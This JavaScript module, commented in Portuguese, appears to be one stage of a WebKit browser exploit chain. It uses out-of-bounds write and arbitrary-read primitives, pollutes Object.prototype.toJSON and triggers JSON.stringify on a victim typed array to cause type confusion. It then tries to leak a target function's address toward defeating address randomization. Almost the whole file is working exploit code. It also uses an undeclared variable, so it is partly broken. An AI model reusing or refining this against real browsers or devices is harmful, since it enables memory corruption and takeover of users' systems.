// js/script3/testArrayBufferVictimCrash.mjs (R43L - TC com Propriedade Alvo em M2)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_TCPropLeak";

const VICTIM_TA_SIZE_ELEMENTS = 8;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUE_FOR_TC = 0xABABABAB;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak_tc_prop; // Renomeada para clareza
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    return toHex(value);
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC com Propriedade Alvo em M2 ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init TCPropLeak...`;

    targetFunctionForLeak_tc_prop = function someUniqueLeakFunctionR43L_TCProp() { return `target_R43L_TCProp_${Date.now()}`; };
    // Adicionar uma propriedade toJSON à função alvo para ver se é chamada
    targetFunctionForLeak_tc_prop.toJSON = function() {
        logS3("[TARGET_FUNCTION_toJSON] toJSON da targetFunctionForLeak_tc_prop foi chamado!", "vuln_potential");
        return "toJSON_do_target_foi_chamado";
    };


    logS3(`--- Fase 0 (TCPropLeak): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }

    let result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (TCPropLeak): Não aplicável diretamente.", /*...*/ },
        webkit_leak_result: { success: false, msg: "WebKit Leak (TCPropLeak): Não aplicável sem addrof." },
        oob_params_used: { offset: safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE), value: safeToHex(OOB_WRITE_VALUE_FOR_TC) },
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        stringify_output_analysis: { notes: "Não analisado", output_type: null, potential_leak: null }
    };
    
    let victim_ta_for_json_trigger = null;
    let m1_ref_for_sondar = null;
    let m2_object_for_sondar = null;

    let probe_call_count_iter = 0;
    let iteration_tc_first_detection_done = false; // Renomear para tc_detected_in_probe
    let heisenbugConfirmedThisIter = false;     // Renomear para tc_confirmed_in_probe

    function toJSON_TA_Probe_Iter_Closure_TCPropLeak() {
        probe_call_count_iter++; const call_num = probe_call_count_iter;
        const ctts = Object.prototype.toString.call(this);
        const is_m2c = (this === m2_object_for_sondar && m2_object_for_sondar !== null);

        try {
            if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };

            if (call_num === 1 && this === victim_ta_for_json_trigger) {
                logS3(`[PROBE_TCPropLeak] Call #${call_num}: 'this' é victim_ta_for_json_trigger. Configurando M1/M2...`, "debug");
                
                m2_object_for_sondar = { 
                    id: "M2_WITH_TARGET_PROP", 
                    // A propriedade crucial que queremos que JSON.stringify tente serializar
                    target_prop_for_leak: targetFunctionForLeak_tc_prop,
                    other_data: 12345
                };
                logS3(`   m2_object_for_sondar criado com target_prop_for_leak.`, "debug_detail");

                m1_ref_for_sondar = { marker_id_tc_prop_leak: "M1_TCPropLeak", payload_M2_obj: m2_object_for_sondar };
                return m1_ref_for_sondar;

            } else if (is_m2c) { // `this` é m2_object_for_sondar
                if (!iteration_tc_first_detection_done) { // tc_detected_in_probe
                    iteration_tc_first_detection_done = true; // tc_detected_in_probe
                    heisenbugConfirmedThisIter = true;      // tc_confirmed_in_probe
                    result_for_runner.tc_probe_details = { 
                        call_number_tc_detected: call_num, probe_variant: "TA_Probe_TCPropLeak", 
                        this_type_actual: ctts, this_is_M2: true, 
                        notes: "TC Confirmada. 'this' é m2_object_for_sondar."
                    };
                    logS3(`[PROBE_TCPropLeak] Call #${call_num} (M2C): FIRST TC. 'this' é m2_object_for_sondar (id: ${this.id}). Tipo: ${ctts}`, "vuln");
                    logS3(`   'this' contém target_prop_for_leak: ${typeof this.target_prop_for_leak === 'function'}`, "info");
                }
                // Deixar JSON.stringify tentar serializar 'this' (m2_object_for_sondar)
                // Ele vai encontrar 'target_prop_for_leak' e tentar serializá-lo.
                return this; 
            }
        } catch (e_pm) { 
            result_for_runner.tc_probe_details = { ...(result_for_runner.tc_probe_details || {}), error_probe: `ProbeMainErr:${e_pm.message}` };
            console.error("[PROBE_TCPropLeak] Erro:", e_pm); return { err_pm: call_num, msg: e_pm.message };
        }
        return { gen_m: call_num, type: ctts }; // Fallback para chamadas inesperadas
    }

    let iter_primary_error = null;
    let iter_raw_stringify_output = null; // Corrigido: Declarar aqui

    try {
        logS3(`  --- Fase 1 (TCPropLeak): Configuração e Trigger da TC ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS);
        logS3(`   victim_ta_for_json_trigger criado. Length: ${victim_ta_for_json_trigger.length}`, "info");

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE_FOR_TC, 4);
        logS3(`   OOB Write: ${safeToHex(OOB_WRITE_VALUE_FOR_TC)} @ ${safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
        await PAUSE_S3(150);

        logS3(`  --- Tentativa de Detecção de TC e Leak via Stringify(M2) ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_TCPropLeak, writable: true, configurable: true, enumerable: false });
            polluted = true;
            
            // CORRIGIDO: Atribuição de iter_raw_stringify_output movida para dentro do try
            iter_raw_stringify_output = JSON.stringify(victim_ta_for_json_trigger); 
            result_for_runner.stringifyResult = iter_raw_stringify_output; // Armazenar o raw output
            logS3(`   JSON.stringify raw output: ${iter_raw_stringify_output}`, "leak_detail");

            // Análise do output
            result_for_runner.stringify_output_analysis.output_type = typeof iter_raw_stringify_output;
            if (typeof iter_raw_stringify_output === 'string') {
                // Procurar por padrões que possam indicar um endereço (ex: "0x...", ou se a função foi convertida para string)
                // Isto é altamente especulativo.
                if (iter_raw_stringify_output.includes("function someUniqueLeakFunctionR43L_TCProp")) {
                    result_for_runner.stringify_output_analysis.potential_leak = "Source da função incluída no JSON.";
                    logS3(`   Análise Stringify: Source da função alvo parece estar no output JSON!`, "vuln_potential");
                } else if (iter_raw_stringify_output.includes("toJSON_do_target_foi_chamado")) {
                    result_for_runner.stringify_output_analysis.potential_leak = "toJSON da função alvo foi chamado durante stringify.";
                    logS3(`   Análise Stringify: toJSON() da função alvo foi chamado!`, "vuln");
                }
                // Adicionar mais heurísticas se necessário.
            }


            result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe = heisenbugConfirmedThisIter;
            if (heisenbugConfirmedThisIter) {
                logS3(`  TC Probe (TCPropLeak): TC CONFIRMADA.`, "vuln");
            } else {
                logS3(`  TC Probe (TCPropLeak): TC NÃO Confirmada.`, "warn");
            }
        } catch (e_str) {
            if (!iter_primary_error) iter_primary_error = e_str;
            // CORRIGIDO: Não referenciar iter_raw_stringify_output aqui se ele não foi definido
            logS3(`  TC Probe (TCPropLeak): JSON.stringify EXCEPTION: ${e_str.message}`, "error");
            result_for_runner.stringifyResult = { error_during_stringify: e_str.message };
        } finally {
            if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
        }
        
        logS3(`  --- Fase de TC e Leak via Stringify Concluída. TC: ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_TEST_BASE);

    } catch (e_outer_iter) {
        if (!iter_primary_error) iter_primary_error = e_outer_iter;
        result_for_runner.errorOccurred = e_outer_iter.message || String(e_outer_iter);
        logS3(`  CRITICAL ERROR ITERATION TCPropLeak: ${result_for_runner.errorOccurred}`, "critical", FNAME_CURRENT_TEST_BASE);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    // CORRIGIDO: Atribuir final_probe_call_count_for_report antes de usá-lo
    final_probe_call_count_for_report = probe_call_count_iter;
    result_for_runner.total_probe_calls_last_iter = final_probe_call_count_for_report;
    result_for_runner.iteration_results_summary = [{ /* ... sumário simples ... */ }]; // Para compatibilidade
    result_for_runner.oob_value_of_best_result = safeToHex(OOB_WRITE_VALUE_FOR_TC); // Para compatibilidade
    result_for_runner.heisenbug_on_M2_in_best_result = result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe; // Para compatibilidade


    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (TCPropLeak): ${JSON.stringify(result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    let final_title_status = "No Notable Result";
    if (result_for_runner.stringify_output_analysis?.potential_leak) {
        final_title_status = `Potential Leak via Stringify! (${result_for_runner.stringify_output_analysis.potential_leak.substring(0,20)})`;
    } else if (result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
        final_title_status = "TC Confirmed, No Obvious Stringify Leak";
    } else if (result_for_runner.errorOccurred) {
        final_title_status = `Error - ${result_for_runner.errorOccurred}`;
    }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return result_for_runner;
}
